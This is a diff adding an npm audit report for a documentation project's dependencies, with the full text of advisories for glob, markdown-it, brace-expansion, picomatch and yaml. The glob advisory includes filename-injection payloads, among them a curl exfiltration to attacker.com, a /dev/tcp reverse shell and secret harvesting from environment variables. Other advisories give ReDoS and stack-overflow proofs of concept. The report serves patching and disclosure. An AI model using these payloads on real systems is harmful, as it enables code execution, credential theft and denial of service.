@@ -1,0 +1,1068 @@
+{
+  "actions": [
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1115551,
+          "path": ".>@rspress/core>tinyglobby>picomatch",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1115554,
+          "path": ".>@rspress/core>tinyglobby>picomatch",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "picomatch",
+      "target": "4.0.4",
+      "depth": 4
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1115556,
+          "path": ".>lint-staged>yaml",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "yaml",
+      "target": "2.9.0",
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1115805,
+          "path": ".>@rspress/core>lodash-es",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1115809,
+          "path": ".>@rspress/core>lodash-es",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "lodash-es",
+      "target": "4.18.1",
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1116373,
+          "path": ".>@rspress/core>@unhead/react>unhead",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "@unhead/react",
+      "target": "2.1.15",
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1116663,
+          "path": ".>rspress-plugin-mermaid>mermaid>dompurify",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1117138,
+          "path": ".>rspress-plugin-mermaid>mermaid>dompurify",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1117139,
+          "path": ".>rspress-plugin-mermaid>mermaid>dompurify",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1117140,
+          "path": ".>rspress-plugin-mermaid>mermaid>dompurify",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "dompurify",
+      "target": "3.4.5",
+      "depth": 4
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1117990,
+          "path": ".>rspress-plugin-mermaid>mermaid",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1117994,
+          "path": ".>rspress-plugin-mermaid>mermaid",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1118512,
+          "path": ".>rspress-plugin-mermaid>mermaid",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1118514,
+          "path": ".>rspress-plugin-mermaid>mermaid",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1119441,
+          "path": ".>rspress-plugin-mermaid>mermaid>uuid",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "mermaid",
+      "target": "10.9.6",
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1119088,
+          "path": ".>rspress-plugin-mermaid>rspress-plugin-devkit>ts-morph>@ts-morph/common>minimatch>brace-expansion",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "brace-expansion",
+      "target": "5.0.6",
+      "depth": 7
+    },
+    {
+      "action": "review",
+      "module": "glob",
+      "resolves": [
+        {
+          "id": 1109842,
+          "path": ".>markdownlint-cli>glob",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "markdown-it",
+      "resolves": [
+        {
+          "id": 1113190,
+          "path": ".>markdownlint>markdown-it",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "brace-expansion",
+      "resolves": [
+        {
+          "id": 1115541,
+          "path": ".>markdownlint-cli>minimatch>brace-expansion",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "picomatch",
+      "resolves": [
+        {
+          "id": 1115549,
+          "path": ".>lint-staged>micromatch>picomatch",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1115552,
+          "path": ".>lint-staged>micromatch>picomatch",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1109842": {
+      "findings": [
+        {
+          "version": "10.3.16",
+          "paths": [
+            ".>markdownlint-cli>glob"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-glob/security/advisories/GHSA-5j98-mcp5-4vw2\n- https://github.com/isaacs/node-glob/commit/47473c046b91c67269df7a66eab782a6c2716146\n- https://nvd.nist.gov/vuln/detail/CVE-2025-64756\n- https://github.com/isaacs/node-glob/commit/1e4e297342a09f2aa0ced87fcd4a70ddc325d75f\n- https://github.com/advisories/GHSA-5j98-mcp5-4vw2",
+      "created": "2025-11-17T17:38:56.000Z",
+      "id": 1109842,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe glob CLI contains a command injection vulnerability in its `-c/--cmd` option that allows arbitrary command execution when processing files with malicious names. When `glob -c <command> <patterns>` is used, matched filenames are passed to a shell with `shell: true`, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in `src/bin.mts:277` where the CLI collects glob matches and executes the supplied command using `foregroundChild()` with `shell: true`:\n\n```javascript\nstream.on('end', () => foregroundChild(cmd, matches, { shell: true }))\n```\n\n**Technical Flow:**\n1. User runs `glob -c <command> <pattern>` \n2. CLI finds files matching the pattern\n3. Matched filenames are collected into an array\n4. Command is executed with matched filenames as arguments using `shell: true`\n5. Shell interprets metacharacters in filenames as command syntax\n6. Malicious filenames execute arbitrary commands\n\n**Affected Component:**\n- **CLI Only:** The vulnerability affects only the command-line interface\n- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected\n- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)\n\n**Attack Surface:**\n- Files with names containing shell metacharacters: `$()`, backticks, `;`, `&`, `|`, etc.\n- Any directory where attackers can control filenames (PR branches, archives, user uploads)\n- CI/CD pipelines using `glob -c` on untrusted content\n\n### PoC\n\n**Setup Malicious File:**\n```bash\nmkdir test_directory && cd test_directory\n\n# Create file with command injection payload in filename\ntouch '$(touch injected_poc)'\n```\n\n**Trigger Vulnerability:**\n```bash\n# Run glob CLI with -c option\nnode /path/to/glob/dist/esm/bin.mjs -c echo \"**/*\"\n```\n\n**Result:**\n- The echo command executes normally\n- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell\n- A new file `injected_poc` is created, proving command execution\n- Any command can be injected this way with full user privileges\n\n**Advanced Payload Examples:**\n\n**Data Exfiltration:**\n```bash\n# Filename: $(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)\ntouch '$(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)'\n```\n\n**Reverse Shell:**\n```bash\n# Filename: $(bash -i >& /dev/tcp/attacker.com/4444 0>&1)\ntouch '$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)'\n```\n\n**Environment Variable Harvesting:**\n```bash\n# Filename: $(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)\ntouch '$(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)'\n```\n\n### Impact\n\n**Arbitrary Command Execution:**\n- Commands execute with full privileges of the user running glob CLI\n- No privilege escalation required - runs as current user\n- Access to environment variables, file system, and network\n\n**Real-World Attack Scenarios:**\n\n**1. CI/CD Pipeline Compromise:**\n- Malicious PR adds files with crafted names to repository\n- CI pipeline uses `glob -c` to process files (linting, testing, deployment)\n- Commands execute in CI environment with build secrets and deployment credentials\n- Potential for supply chain compromise through artifact tampering\n\n**2. Developer Workstation Attack:**\n- Developer clones repository or extracts archive containing malicious filenames\n- Local build scripts use `glob -c` for file processing\n- Developer machine compromise with access to SSH keys, tokens, local services\n\n**3. Automated Processing Systems:**\n- Services using glob CLI to process uploaded files or external content\n- File uploads with malicious names trigger command execution\n- Server-side compromise with potential for lateral movement\n\n**4. Supply Chain Poisoning:**\n- Malicious packages or themes include files with crafted names\n- Build processes using glob CLI automatically process these files\n- Wide distribution of compromise through package ecosystems\n\n**Platform-Specific Risks:**\n- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing\n- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL\n- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** glob\n- **Component:** CLI only (`src/bin.mts`)\n- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)\n- **Introduced:** v10.2.0 (first release with CLI containing `-c/--cmd` option)\n- **Patched versions:** 11.1.0and 10.5.0\n\n**Scope Limitation:**\n- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe\n- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable\n\n### Remediation\n\n- Upgrade to `glob@10.5.0`, `glob@11.1.0`, or higher, as soon as possible.\n- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.\n- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results.",
+      "reported_by": null,
+      "title": "glob CLI: Command injection via -c/--cmd executes matches with shell:true",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-64756"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "glob",
+      "vulnerable_versions": ">=10.2.0 <10.5.0",
+      "github_advisory_id": "GHSA-5j98-mcp5-4vw2",
+      "recommendation": "Upgrade to version 10.5.0 or later",
+      "patched_versions": ">=10.5.0",
+      "updated": "2025-11-19T02:30:53.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-78"
+      ],
+      "url": "https://github.com/advisories/GHSA-5j98-mcp5-4vw2"
+    },
+    "1113190": {
+      "findings": [
+        {
+          "version": "14.0.0",
+          "paths": [
+            ".>markdownlint>markdown-it"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-2327\n- https://github.com/markdown-it/markdown-it/commit/4b4bbcae5e0990a5b172378e507b33a59012ed26\n- https://gist.github.com/ltduc147/c9abecae1b291ede4f692f2ab988c917\n- https://security.snyk.io/vuln/SNYK-JS-MARKDOWNIT-10666750\n- https://github.com/markdown-it/markdown-it/blob/14.1.0/lib/rules_inline/linkify.mjs#L33\n- https://github.com/advisories/GHSA-38c4-r59v-3vqw",
+      "created": "2026-02-12T06:30:13.000Z",
+      "id": 1113190,
+      "npm_advisory_id": null,
+      "overview": "Versions of the package markdown-it from 13.0.0 and before 14.1.1 are vulnerable to Regular Expression Denial of Service (ReDoS) due to the use of the regex /\\*+$/ in the linkify function. An attacker can supply a long sequence of * characters followed by a non-matching character, which triggers excessive backtracking and may lead to a denial-of-service condition.",
+      "reported_by": null,
+      "title": "markdown-it is has a Regular Expression Denial of Service (ReDoS)",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-2327"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "markdown-it",
+      "vulnerable_versions": ">=13.0.0 <14.1.1",
+      "github_advisory_id": "GHSA-38c4-r59v-3vqw",
+      "recommendation": "Upgrade to version 14.1.1 or later",
+      "patched_versions": ">=14.1.1",
+      "updated": "2026-02-13T20:04:40.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-38c4-r59v-3vqw"
+    },
+    "1115541": {
+      "findings": [
+        {
+          "version": "2.0.2",
+          "paths": [
+            ".>markdownlint-cli>minimatch>brace-expansion"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-f886-m6hf-6m8v\n- https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L107-L113\n- https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L184\n- https://github.com/juliangruber/brace-expansion/issues/98\n- https://github.com/juliangruber/brace-expansion/pull/95\n- https://github.com/juliangruber/brace-expansion/pull/96\n- https://github.com/juliangruber/brace-expansion/pull/97\n- https://github.com/juliangruber/brace-expansion/commit/311ac0d54994158c0a384e286a7d6cbb17ee8ed5\n- https://github.com/juliangruber/brace-expansion/commit/7fd684f89fdde3549563d0a6522226a9189472a2\n- https://github.com/juliangruber/brace-expansion/commit/b9cacd9e55e7a1fa588fe4b7bb1159d52f1d902a\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33750\n- https://github.com/advisories/GHSA-f886-m6hf-6m8v",
+      "created": "2026-03-26T18:29:42.000Z",
+      "id": 1115541,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nA brace pattern with a zero step value (e.g., `{1..2..0}`) causes the sequence generation loop to run indefinitely, making the process hang for seconds and allocate heaps of memory.\n\nThe loop in question:\n\nhttps://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L184\n\n`test()` is one of\n\nhttps://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L107-L113\n\nThe increment is computed as `Math.abs(0) = 0`, so the loop variable never advances. On a test machine, the process hangs for about 3.5 seconds and allocates roughly 1.9 GB of memory before throwing a `RangeError`. Setting max to any value has no effect because the limit is only checked at the output combination step, not during sequence generation.\n\nThis affects any application that passes untrusted strings to expand(), or by error sets a step value of `0`. That includes tools built on minimatch/glob that resolve patterns from CLI arguments or config files. The input needed is just 10 bytes.\n\n### Patches\n\n\nUpgrade to versions\n- 5.0.5+\n\nA step increment of 0 is now sanitized to 1, which matches bash behavior.\n\n### Workarounds\n\nSanitize strings passed to `expand()` to ensure a step value of `0` is not used.",
+      "reported_by": null,
+      "title": "brace-expansion: Zero-step sequence causes process hang and memory exhaustion",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-33750"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "brace-expansion",
+      "vulnerable_versions": ">=2.0.0 <2.0.3",
+      "github_advisory_id": "GHSA-f886-m6hf-6m8v",
+      "recommendation": "Upgrade to version 2.0.3 or later",
+      "patched_versions": ">=2.0.3",
+      "updated": "2026-03-27T21:38:55.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400"
+      ],
+      "url": "https://github.com/advisories/GHSA-f886-m6hf-6m8v"
+    },
+    "1115549": {
+      "findings": [
+        {
+          "version": "2.3.1",
+          "paths": [
+            ".>lint-staged>micromatch>picomatch"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/micromatch/picomatch/security/advisories/GHSA-3v7f-55p6-f55p\n- https://github.com/micromatch/picomatch/commit/4516eb521f13a46b2fe1a1d2c9ef6b20ddc0e903\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33672\n- https://github.com/advisories/GHSA-3v7f-55p6-f55p",
+      "created": "2026-03-25T21:13:39.000Z",
+      "id": 1115549,
+      "npm_advisory_id": null,
+      "overview": "### Impact\npicomatch is vulnerable to a **method injection vulnerability (CWE-1321)** affecting the `POSIX_REGEX_SOURCE` object. Because the object inherits from `Object.prototype`, specially crafted POSIX bracket expressions (e.g., `[[:constructor:]]`) can reference inherited method names. These methods are implicitly converted to strings and injected into the generated regular expression.\n\nThis leads to **incorrect glob matching behavior (integrity impact)**, where patterns may match unintended filenames. The issue does **not enable remote code execution**, but it can cause security-relevant logic errors in applications that rely on glob matching for filtering, validation, or access control.\n\nAll users of affected `picomatch` versions that process untrusted or user-controlled glob patterns are potentially impacted.\n\n### Patches\n\nThis issue is fixed in picomatch 4.0.4, 3.0.2 and 2.3.2.\n\nUsers should upgrade to one of these versions or later, depending on their supported release line.\n\n### Workarounds\n\nIf upgrading is not immediately possible, avoid passing untrusted glob patterns to picomatch.\n\nPossible mitigations include:\n- Sanitizing or rejecting untrusted glob patterns, especially those containing POSIX character classes like `[[:...:]]`.\n- Avoiding the use of POSIX bracket expressions if user input is involved.\n- Manually patching the library by modifying `POSIX_REGEX_SOURCE` to use a null prototype:\n\n  ```js\n  const POSIX_REGEX_SOURCE = {\n    __proto__: null,\n    alnum: 'a-zA-Z0-9',\n    alpha: 'a-zA-Z',\n    // ... rest unchanged\n  };\n  \n### Resources\n\n- fix for similar issue: https://github.com/micromatch/picomatch/pull/144\n- picomatch repository https://github.com/micromatch/picomatch",
+      "reported_by": null,
+      "title": "Picomatch: Method Injection in POSIX Character Classes causes incorrect Glob Matching",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-33672"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "picomatch",
+      "vulnerable_versions": "<2.3.2",
+      "github_advisory_id": "GHSA-3v7f-55p6-f55p",
+      "recommendation": "Upgrade to version 2.3.2 or later",
+      "patched_versions": ">=2.3.2",
+      "updated": "2026-03-27T21:36:25.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-3v7f-55p6-f55p"
+    },
+    "1115551": {
+      "findings": [
+        {
+          "version": "4.0.3",
+          "paths": [
+            ".>@rspress/core>tinyglobby>picomatch"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/micromatch/picomatch/security/advisories/GHSA-3v7f-55p6-f55p\n- https://github.com/micromatch/picomatch/commit/4516eb521f13a46b2fe1a1d2c9ef6b20ddc0e903\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33672\n- https://github.com/advisories/GHSA-3v7f-55p6-f55p",
+      "created": "2026-03-25T21:13:39.000Z",
+      "id": 1115551,
+      "npm_advisory_id": null,
+      "overview": "### Impact\npicomatch is vulnerable to a **method injection vulnerability (CWE-1321)** affecting the `POSIX_REGEX_SOURCE` object. Because the object inherits from `Object.prototype`, specially crafted POSIX bracket expressions (e.g., `[[:constructor:]]`) can reference inherited method names. These methods are implicitly converted to strings and injected into the generated regular expression.\n\nThis leads to **incorrect glob matching behavior (integrity impact)**, where patterns may match unintended filenames. The issue does **not enable remote code execution**, but it can cause security-relevant logic errors in applications that rely on glob matching for filtering, validation, or access control.\n\nAll users of affected `picomatch` versions that process untrusted or user-controlled glob patterns are potentially impacted.\n\n### Patches\n\nThis issue is fixed in picomatch 4.0.4, 3.0.2 and 2.3.2.\n\nUsers should upgrade to one of these versions or later, depending on their supported release line.\n\n### Workarounds\n\nIf upgrading is not immediately possible, avoid passing untrusted glob patterns to picomatch.\n\nPossible mitigations include:\n- Sanitizing or rejecting untrusted glob patterns, especially those containing POSIX character classes like `[[:...:]]`.\n- Avoiding the use of POSIX bracket expressions if user input is involved.\n- Manually patching the library by modifying `POSIX_REGEX_SOURCE` to use a null prototype:\n\n  ```js\n  const POSIX_REGEX_SOURCE = {\n    __proto__: null,\n    alnum: 'a-zA-Z0-9',\n    alpha: 'a-zA-Z',\n    // ... rest unchanged\n  };\n  \n### Resources\n\n- fix for similar issue: https://github.com/micromatch/picomatch/pull/144\n- picomatch repository https://github.com/micromatch/picomatch",
+      "reported_by": null,
+      "title": "Picomatch: Method Injection in POSIX Character Classes causes incorrect Glob Matching",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-33672"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "picomatch",
+      "vulnerable_versions": ">=4.0.0 <4.0.4",
+      "github_advisory_id": "GHSA-3v7f-55p6-f55p",
+      "recommendation": "Upgrade to version 4.0.4 or later",
+      "patched_versions": ">=4.0.4",
+      "updated": "2026-03-27T21:36:25.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-3v7f-55p6-f55p"
+    },
+    "1115552": {
+      "findings": [
+        {
+          "version": "2.3.1",
+          "paths": [
+            ".>lint-staged>micromatch>picomatch"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/micromatch/picomatch/security/advisories/GHSA-c2c7-rcm5-vvqj\n- https://github.com/micromatch/picomatch/commit/5eceecd27543b8e056b9307d69e105ea03618a7d\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33671\n- https://github.com/advisories/GHSA-c2c7-rcm5-vvqj",
+      "created": "2026-03-25T21:12:07.000Z",
+      "id": 1115552,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n`picomatch` is vulnerable to Regular Expression Denial of Service (ReDoS) when processing crafted extglob patterns. Certain patterns using extglob quantifiers such as `+()` and `*()`, especially when combined with overlapping alternatives or nested extglobs, are compiled into regular expressions that can exhibit catastrophic backtracking on non-matching input.\n\nExamples of problematic patterns include `+(a|aa)`, `+(*|?)`, `+(+(a))`, `*(+(a))`, and `+(+(+(a)))`. In local reproduction, these patterns caused multi-second event-loop blocking with relatively short inputs. For example, `+(a|aa)` compiled to `^(?:(?=.)(?:a|aa)+)$` and took about 2 seconds to reject a 41-character non-matching input, while nested patterns such as `+(+(a))` and `*(+(a))` took around 29 seconds to reject a 33-character input on a modern M1 MacBook.\n\nApplications are impacted when they allow untrusted users to supply glob patterns that are passed to `picomatch` for compilation or matching. In those cases, an attacker can cause excessive CPU consumption and block the Node.js event loop, resulting in a denial of service. Applications that only use trusted, developer-controlled glob patterns are much less likely to be exposed in a security-relevant way.\n\n### Patches\nThis issue is fixed in picomatch 4.0.4, 3.0.2 and 2.3.2.\n\nUsers should upgrade to one of these versions or later, depending on their supported release line.\n\n### Workarounds\nIf upgrading is not immediately possible, avoid passing untrusted glob patterns to `picomatch`.\n\nPossible mitigations include:\n- disable extglob support for untrusted patterns by using `noextglob: true`\n- reject or sanitize patterns containing nested extglobs or extglob quantifiers such as `+()` and `*()`\n- enforce strict allowlists for accepted pattern syntax\n- run matching in an isolated worker or separate process with time and resource limits\n- apply application-level request throttling and input validation for any endpoint that accepts glob patterns\n\n### Resources\n- Picomatch repository: https://github.com/micromatch/picomatch\n- `lib/parse.js` and `lib/constants.js` are involved in generating the vulnerable regex forms\n- Comparable ReDoS precedent: CVE-2024-4067 (`micromatch`)\n- Comparable generated-regex precedent: CVE-2024-45296 (`path-to-regexp`)",
+      "reported_by": null,
+      "title": "Picomatch has a ReDoS vulnerability via extglob quantifiers",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-33671"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "picomatch",
+      "vulnerable_versions": "<2.3.2",
+      "github_advisory_id": "GHSA-c2c7-rcm5-vvqj",
+      "recommendation": "Upgrade to version 2.3.2 or later",
+      "patched_versions": ">=2.3.2",
+      "updated": "2026-03-27T21:36:14.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-c2c7-rcm5-vvqj"
+    },
+    "1115554": {
+      "findings": [
+        {
+          "version": "4.0.3",
+          "paths": [
+            ".>@rspress/core>tinyglobby>picomatch"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/micromatch/picomatch/security/advisories/GHSA-c2c7-rcm5-vvqj\n- https://github.com/micromatch/picomatch/commit/5eceecd27543b8e056b9307d69e105ea03618a7d\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33671\n- https://github.com/advisories/GHSA-c2c7-rcm5-vvqj",
+      "created": "2026-03-25T21:12:07.000Z",
+      "id": 1115554,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n`picomatch` is vulnerable to Regular Expression Denial of Service (ReDoS) when processing crafted extglob patterns. Certain patterns using extglob quantifiers such as `+()` and `*()`, especially when combined with overlapping alternatives or nested extglobs, are compiled into regular expressions that can exhibit catastrophic backtracking on non-matching input.\n\nExamples of problematic patterns include `+(a|aa)`, `+(*|?)`, `+(+(a))`, `*(+(a))`, and `+(+(+(a)))`. In local reproduction, these patterns caused multi-second event-loop blocking with relatively short inputs. For example, `+(a|aa)` compiled to `^(?:(?=.)(?:a|aa)+)$` and took about 2 seconds to reject a 41-character non-matching input, while nested patterns such as `+(+(a))` and `*(+(a))` took around 29 seconds to reject a 33-character input on a modern M1 MacBook.\n\nApplications are impacted when they allow untrusted users to supply glob patterns that are passed to `picomatch` for compilation or matching. In those cases, an attacker can cause excessive CPU consumption and block the Node.js event loop, resulting in a denial of service. Applications that only use trusted, developer-controlled glob patterns are much less likely to be exposed in a security-relevant way.\n\n### Patches\nThis issue is fixed in picomatch 4.0.4, 3.0.2 and 2.3.2.\n\nUsers should upgrade to one of these versions or later, depending on their supported release line.\n\n### Workarounds\nIf upgrading is not immediately possible, avoid passing untrusted glob patterns to `picomatch`.\n\nPossible mitigations include:\n- disable extglob support for untrusted patterns by using `noextglob: true`\n- reject or sanitize patterns containing nested extglobs or extglob quantifiers such as `+()` and `*()`\n- enforce strict allowlists for accepted pattern syntax\n- run matching in an isolated worker or separate process with time and resource limits\n- apply application-level request throttling and input validation for any endpoint that accepts glob patterns\n\n### Resources\n- Picomatch repository: https://github.com/micromatch/picomatch\n- `lib/parse.js` and `lib/constants.js` are involved in generating the vulnerable regex forms\n- Comparable ReDoS precedent: CVE-2024-4067 (`micromatch`)\n- Comparable generated-regex precedent: CVE-2024-45296 (`path-to-regexp`)",
+      "reported_by": null,
+      "title": "Picomatch has a ReDoS vulnerability via extglob quantifiers",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-33671"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "picomatch",
+      "vulnerable_versions": ">=4.0.0 <4.0.4",
+      "github_advisory_id": "GHSA-c2c7-rcm5-vvqj",
+      "recommendation": "Upgrade to version 4.0.4 or later",
+      "patched_versions": ">=4.0.4",
+      "updated": "2026-03-27T21:36:14.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-c2c7-rcm5-vvqj"
+    },
+    "1115556": {
+      "findings": [
+        {
+          "version": "2.8.2",
+          "paths": [
+            ".>lint-staged>yaml"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/eemeli/yaml/security/advisories/GHSA-48c2-rrv3-qjmp\n- https://github.com/eemeli/yaml/commit/1e84ebbea7ec35011a4c61bbb820a529ee4f359b\n- https://github.com/eemeli/yaml/releases/tag/v1.10.3\n- https://github.com/eemeli/yaml/releases/tag/v2.8.3\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33532\n- https://github.com/advisories/GHSA-48c2-rrv3-qjmp",
+      "created": "2026-03-25T20:08:24.000Z",
+      "id": 1115556,
+      "npm_advisory_id": null,
+      "overview": "Parsing a YAML document with `yaml` may throw a RangeError due to a stack overflow.\n\nThe node resolution/composition phase uses recursive function calls without a depth bound. An attacker who can supply YAML for parsing can trigger a `RangeError: Maximum call stack size exceeded` with a small payload (~2–10 KB). The `RangeError` is not a `YAMLParseError`, so applications that only catch YAML-specific errors will encounter an unexpected exception type. Depending on the host application's exception handling, this can fail requests or terminate the Node.js process.\n\nFlow sequences allow deep nesting with minimal bytes (2 bytes per level: one `[` and one `]`). On the default Node.js stack, approximately 1,000–5,000 levels of nesting (2–10 KB input) exhaust the call stack. The exact threshold is environment-dependent (Node.js version, stack size, call stack depth at invocation).\n\nNote: the library's `Parser` (CST phase) uses a stack-based iterative approach and is not affected. Only the compose/resolve phase uses actual call-stack recursion.\n\nAll three public parsing APIs are affected: `YAML.parse()`, `YAML.parseDocument()`, and `YAML.parseAllDocuments()`.\n\n### PoC\n\n```javascript\nconst YAML = require('yaml');\n\n// ~10 KB payload: 5000 levels of nested flow sequences\nconst payload = '['.repeat(5000) + '1' + ']'.repeat(5000);\n\ntry {\n  YAML.parse(payload);\n} catch (e) {\n  console.log(e.constructor.name); // RangeError (NOT YAMLParseError)\n  console.log(e.message);          // Maximum call stack size exceeded\n}\n```\n\nTest environment: Node.js v24.12.0, macOS darwin arm64\n\n| Version | Nesting Depth | Input Size | Result |\n|---|---|---|---|\n| 1.0.0 | 5,000 | 10,001 B | RangeError |\n| 1.10.2 | 5,000 | 10,001 B | RangeError |\n| 2.0.0 | 5,000 | 10,001 B | RangeError |\n| 2.8.2 | 5,000 | 10,001 B | RangeError |\n| 2.8.3 | 5,000 | 10,001 B | YAMLParseError 